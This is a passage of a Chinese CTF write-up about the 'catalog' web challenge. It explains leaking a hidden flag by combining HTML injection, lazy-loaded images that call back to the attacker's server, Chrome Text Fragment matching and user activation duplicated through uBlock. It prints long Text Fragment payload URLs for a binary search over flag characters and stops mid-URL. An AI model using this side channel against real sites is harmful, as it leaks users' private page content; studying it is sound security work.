class="hljs-string">&quot;char7&quot;</span>&gt;</span>i<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char8&quot;</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char9&quot;</span>&gt;</span>l<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char10&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5728;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4E00;&#x4E2A;<code>&lt;em&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x5373;&#x53EF;&#x628A;&#x5185;&#x5BB9;&#x62C6;&#x5206;&#x4E3A;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#xFF0C;&#x6548;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png" alt></p><p>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x8FDB;&#x884C;&#x9009;&#x4E2D;&#x4E86;&#x3002;</p><h3 id="Spark-Thinking"><a href="#Spark-Thinking" class="headerlink" title="Spark Thinking"></a>Spark Thinking</h3><p>&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x9009;&#x4E2D;&#x4E86;&#x5462;&#xFF1F;</p><p>&#x8FD9;&#x91CC; Exp &#x4F5C;&#x8005;&#x5F88;&#x806A;&#x660E;&#x5730;&#x60F3;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x529E;&#x6CD5;&#xFF1A;</p><ul><li>&#x5229;&#x7528;&#x6211;&#x4EEC;&#x5728; information &#x6BB5;&#x63D0;&#x5230;&#x7684;&#x540C;&#x4E00; session &#x4F1A;&#x5B58;&#x50A8;&#x4E00;&#x5B9A;&#x7684; HTML &#x5143;&#x7D20;&#xFF0C;&#x6240;&#x4EE5;&#x5373;&#x4F7F;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528; fetch no-cors &#x6765;&#x66F4;&#x65B0;&#x754C;&#x9762;&#xFF0C;&#x5229;&#x7528;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x540C;&#x4E00; session &#x7684;&#x754C;&#x9762;&#x5F97;&#x5230;&#x65E0;&#x8FC7;&#x6EE4;&#x7684; HTML &#x6CE8;&#x5165;</li><li>&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x6CE8;&#x5165;&#x521B;&#x9020;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#xFF1A;&#x6CE8;&#x5165;&#x8DB3;&#x591F;&#x591A;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#xFF0C;&#x8BA9; FLAG &#x4F4D;&#x4E8E;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x9875;&#x9762;&#x4E4B;&#x5916;&#xFF0C;&#x5E76;&#x5728;<code>&lt;br&gt;</code>&#x7684;&#x6700;&#x540E;&#x52A0;&#x5165;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#xFF0C;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230;&#x4E86; FLAG</li><li>&#x4E00;&#x5F00;&#x59CB;&#x56E0;&#x4E3A;&#x56FE;&#x7247;&#x88AB;&#x653E;&#x7F6E;&#x5230;&#x4E86;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x4E4B;&#x5916;&#x5E76;&#x4E14;&#x7531;&#x4E8E;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#xFF0C;&#x56FE;&#x7247;&#x5E76;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x8FD9;&#x65F6;&#x5982;&#x679C;<code>#:~:text=P-,C,T,-F</code>&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x7684;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x9875;&#x9762;&#x4F1A;&#x5148;&#x8FDB;&#x884C;&#x6EDA;&#x52A8;&#x5230; FLAG &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x56FE;&#x7247;&#x624D;&#x4F1A;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x56FE;&#x7247;&#x61D2;&#x52A0;&#x8F7D;&#x6765;&#x786E;&#x5B9A;&#x5339;&#x914D;&#x6210;&#x529F;&#xFF1B;&#x5982;&#x679C;&#x5339;&#x914D;&#x4E0D;&#x6210;&#x529F;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4E0D;&#x4F1A;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;</li><li>&#x6240;&#x4EE5;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x81EA;&#x5DF1;&#x7684; vps &#x76D1;&#x542C;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x8BA9;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;&#x5728;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BF7;&#x6C42;&#x6211;&#x4EEC;&#x7684; vps &#x5C31;&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5339;&#x914D;&#x6210;&#x529F;&#x4E86;</li></ul><blockquote class="colorquote info"><p>Note:</p><blockquote><p>Support the &#x2018;loading&#x2019; attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on <code>&lt;iframe&gt;</code> and <code>&lt;img&gt;</code> elements.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53EA;&#x6709;&#x5F53;&#x7528;&#x6237;&#x7A97;&#x53E3;&#x9875;&#x9762;&#x5185;&#x5173;&#x6CE8;&#x5230;<code>&lt;img&gt;</code>&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x8BE5;&#x6807;&#x7B7E;&#x624D;&#x80FD;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;img&gt;</code>&#x539F;&#x751F;&#x5C5E;&#x6027;<code>loading=lazy</code>&#x6765;&#x5B9E;&#x73B0;&#xFF0C;Chrome 76&#x4EE5;&#x540E;&#x7684;&#x7248;&#x672C;&#x90FD;&#x5DF2;&#x5B9E;&#x73B0;&#x4E86;&#x8BE5;&#x529F;&#x80FD;&#x2014;&#x2014;<a href="https://chromestatus.com/feature/5645767347798016" target="_blank" rel="noopener">Lazily load iframes and images via &#x2018;loading&#x2019; attribute</a></p></blockquote><p>&#x81F3;&#x6B64;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6BD4;&#x8F83;&#x5173;&#x952E;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x90FD;&#x8BF4;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x5B9E;&#x73B0;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x7EC6;&#x8282;&#x7684;&#x5730;&#x65B9;&#x4E86;&#x3002;</p><h3 id="uBlock-amp-User-Activation-amp-Text-Fragments"><a href="#uBlock-amp-User-Activation-amp-Text-Fragments" class="headerlink" title="uBlock &amp; User Activation &amp; Text Fragments"></a>uBlock &amp; User Activation &amp; Text Fragments</h3><p>&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x56DE;&#x5934;&#x770B; uBlock &amp; User Activation &#x5728;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x8D77;&#x5230;&#x4E86;&#x4EC0;&#x4E48;&#x4F5C;&#x7528;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A; Chrome 80 &#x5F15;&#x5165;&#x4E86; Text Fragments &#x7684;&#x673A;&#x5236;&#xFF0C;&#x7EFC;&#x4E0A;&#x6211;&#x4EEC;&#x7684;&#x5206;&#x6790;&#x5229;&#x7528;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x9762;&#xFF0C;&#x7528;&#x8FD9;&#x79CD;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x9690;&#x79C1;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x7136;&#x51FA;&#x4E8E;&#x9690;&#x79C1;&#x8003;&#x8651;&#xFF0C; Google &#x4E5F;&#x5F15;&#x5165;&#x4E86;&#x76F8;&#x5BF9;&#x7684;&#x9650;&#x5236;&#x673A;&#x5236;&#xFF1A;</p><blockquote><p>The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a &#x201C;noopener&#x201D; context, such that the destination page is known to be sufficiently isolated.</p></blockquote><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6CE8;&#x610F;&#x5230;&#x5176;&#x4E2D;&#x975E;&#x5E38;&#x5173;&#x952E;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF1A; <em>*<em>In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. *</em></em></p><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4; Text Fragments &#x529F;&#x80FD;&#x4EC5;&#x5728;&#x7531;&#x4E8E; User Activation &#x4EA7;&#x751F;&#x7684;&#x5B8C;&#x6574;&#x5BFC;&#x5411;&#x4E0A;&#x624D;&#x80FD;&#x751F;&#x6548;&#xFF0C;&#x6CA1;&#x6709; User Activation &#x662F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF01;&#x5728;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230; Google &#x5BF9;&#x4E8E; *<em>User Activation *</em> &#x505A;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x5F3A;&#x8C03;&#xFF1A;</p><blockquote><p>The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</p></blockquote><p><em><strong>For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</strong></em></p><p>&#x56E0;&#x6B64;&#xFF0C;&#x57FA;&#x4E8E; User Activation &#x548C;&#x6D4F;&#x89C8;&#x4E0A;&#x4E0B;&#x6587;&#x9694;&#x79BB;&#x7684;&#x9650;&#x5236;&#x975E;&#x5E38;&#x91CD;&#x8981;&#xFF0C;&#x5FC5;&#x987B;&#x4E88;&#x4EE5;&#x5B9E;&#x65BD;&#x3002;</p><p>&#x81F3;&#x4E8E; Chrome &#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x9650;&#x5236;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/#restricting-the-text-fragment" target="_blank" rel="noopener">Restricting the Text Fragment</a> &#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x4ECE;&#x4EE5;&#x4E0A;&#x6765;&#x770B;&#xFF0C;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x9898;&#x56FE;&#x5C31;&#x5F88;&#x660E;&#x663E;&#x4E86;&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.</p></blockquote><p>&#x5E76;&#x4E14;&#x6839;&#x636E; <a href="https://docs.google.com/document/d/1erpl1yqJlc1pH0QvVVmi1s3WzqQLsEXTLLh6VuYp228/" target="_blank" rel="noopener">User Activation v2 in Chrome</a> &#xFF1A;</p><blockquote><p>Full-overlay request from subframes: To grant a subframe&#x2019;s full-overlay request (sent through a postMessage), the main frame will check the subframe&#x2019;s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessage&#x2019;s <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">event source</a> parameter.</p></blockquote><p>&#x4E24;&#x8005;&#x7ED3;&#x5408;&#x5728;&#x4E00;&#x8D77;&#x53EF;&#x80FD;&#x5C31;&#x6BD4;&#x8F83;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x4E86;&#xFF0C;<strong>&#x4EE5;&#x4E0B;&#x662F;&#x4E2A;&#x4EBA;&#x6839;&#x636E;&#x6587;&#x6863;&#x7406;&#x89E3;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53C2;&#x8003;&#x7814;&#x7A76;&#x5177;&#x4F53;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5E08;&#x5085;&#x6839;&#x636E;&#x4EE3;&#x7801;&#x7814;&#x7A76;&#x51FA;&#x7ED3;&#x679C;&#x4E0E;&#x6211;&#x7684;&#x7406;&#x89E3;&#x6709;&#x4EC0;&#x4E48;&#x51FA;&#x5165;&#xFF0C;&#x90A3;&#x4E00;&#x5B9A;&#x662F;&#x6211;&#x9519;&#x4E86;</strong>&#xFF1A;</p><p>&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF1A;&#x7BA1;&#x7406;&#x5458;&#x5355;&#x51FB;&#x4E00;&#x4E2A;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x6253;&#x7684;&#x94FE;&#x63A5;&#xFF0C;&#x5C06;&#x6D88;&#x8017;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x6253;&#x5F00;&#x94FE;&#x63A5;&#xFF0C;&#x800C; uBlock &#x5C06; <code>postMessage</code> &#x53D1;&#x9001;&#x5230;&#x5176;&#x6269;&#x5C55; iframe &#xFF0C;&#x4ECE;&#x800C;&#x590D;&#x5236;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x3002; &#x6BCF;&#x5F53;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x65F6;&#xFF0C;&#x524D;&#x7AEF;&#x90FD;&#x4F1A;&#x4ECE; uBlock &#x6846;&#x67B6;&#x83B7;&#x53D6; postMessage &#xFF0C;&#x4ECE;&#x800C;&#x518D;&#x6B21;&#x5C06;&#x6FC0;&#x6D3B;&#x590D;&#x5236;&#x56DE;&#x53BB;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE; <a href="#Verification">Verification</a> &#x770B;&#x5230;&#x5173;&#x4E8E; uBlock &#x4F20;&#x9012; User Activation &#x7684;&#x9A8C;&#x8BC1;&#x3002;</p><h3 id="Regex"><a href="#Regex" class="headerlink" title="Regex"></a>Regex</h3><p>&#x56E0;&#x4E3A; FLAG &#x6B63;&#x5219;&#x4E3A; <code>/^PCTF\{[A-Z0-9_]+\}$/</code>&#xFF0C;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x7528; Text Fragments &#x53EA;&#x80FD;&#x9A8C;&#x8BC1;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x5982;&#x4E0B; url &#xFF0C;&#x4E00;&#x6B21;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x5B8C;&#x5168;&#x90E8;&#x7684;&#x7B26;&#x5408;&#x6B63;&#x5219;&#x7684;&#x5B57;&#x7B26;&#xFF0C;A-Z0-9_ &#x5916;&#x52A0;&#x4E00;&#x4E2A; } &#x4E3A; FLAG &#x95ED;&#x5408;&#x7684;&#x5B57;&#x7B26;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-J%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-K%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-L%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-M%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">N</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-O%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-P%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Q%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-R%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-S%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">T</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-U%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-V%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-W%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-X%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Y%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Z%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-_</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5219;&#x53BB;&#x6389;&#x4E00;&#x534A;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x91C7;&#x7528;&#x4E8C;&#x5206;&#x7684;&#x5F62;&#x5F0F;&#x7F29;&#x5C0F;&#x6211;&#x4EEC;&#x7684;&#x5339;&#x914D;&#x8303;&#x56F4;&#xFF0C;&#x6240;&#x4EE5;&#x4E0B;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x7684;&#x662F;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span 